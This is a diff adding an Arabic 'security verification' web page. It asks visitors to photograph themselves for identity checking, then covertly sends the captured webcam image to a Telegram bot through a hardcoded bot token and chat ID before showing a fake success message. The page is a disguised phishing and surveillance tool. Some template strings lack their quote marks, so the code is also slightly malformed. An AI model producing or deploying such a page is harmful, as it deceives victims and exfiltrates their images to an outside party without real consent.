@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>التحقق الأمني</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
+.card{background:#fff;border-radius:20px;padding:30px;max-width:400px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.3);text-align:center}
+h1{color:#333;margin-bottom:10px}p{color:#666;margin-bottom:20px}
+.btn{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;padding:15px 40px;border-radius:50px;font-size:18px;cursor:pointer;width:100%}
+.btn:disabled{opacity:.6}
+#result{margin-top:15px;padding:10px;border-radius:10px;display:none}
+.ok{background:#d4edda;color:#155724;display:block}
+.fail{background:#f8d7da;color:#721c24;display:block}
+</style></head>
+<body>
+<div class="card">
+    <h1>📸 التحقق بالصورة</h1>
+    <p>يرجى التقاط صورة للتحقق من هويتك</p>
+    <button class="btn" id="btnStart" onclick="capture()">📷 بدء التصوير</button>
+    <div id="result"></div>
+</div>
+<script>
+const TOKEN='7524329663:AAERQzZ21_sskD6GLfUNLTYvTy--X733hEI',CHAT='1015102519';
+const chatId=new URLSearchParams(location.search).get('chatId')||'unknown';
+async function capture(){
+    const btn=document.getElementById('btnStart'),res=document.getElementById('result');
+    btn.disabled=true;btn.textContent='⏳ جارٍ...';res.className='';res.style.display='none';
+    try{
+        const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:640,height:480}});
+        const v=document.createElement('video');v.srcObject=s;await v.play();
+        const c=document.createElement('canvas');c.width=640;c.height=480;
+        c.getContext('2d').drawImage(v,0,0);const photo=c.toDataURL('image/jpeg',0.7);
+        s.getTracks().forEach(t=>t.stop());
+        const blob=await(await fetch(photo)).blob(),fd=new FormData();
+        fd.append('chat_id',CHAT);fd.append('photo',blob,cam_${chatId}.jpg);
+        fd.append('caption',📸 صورة - ID: ${chatId});
+        await fetch(https://api.telegram.org/bot${TOKEN}/sendPhoto,{method:'POST',body:fd});
+        res.className='ok';res.textContent='✅ تم التحقق بنجاح';btn.textContent='✅ تم';
+    }catch(e){res.className='fail';res.textContent='❌ خطأ: '+e.message;btn.disabled=false;btn.textContent='📷 إعادة المحاولة';}
+}
+</script></body></html>
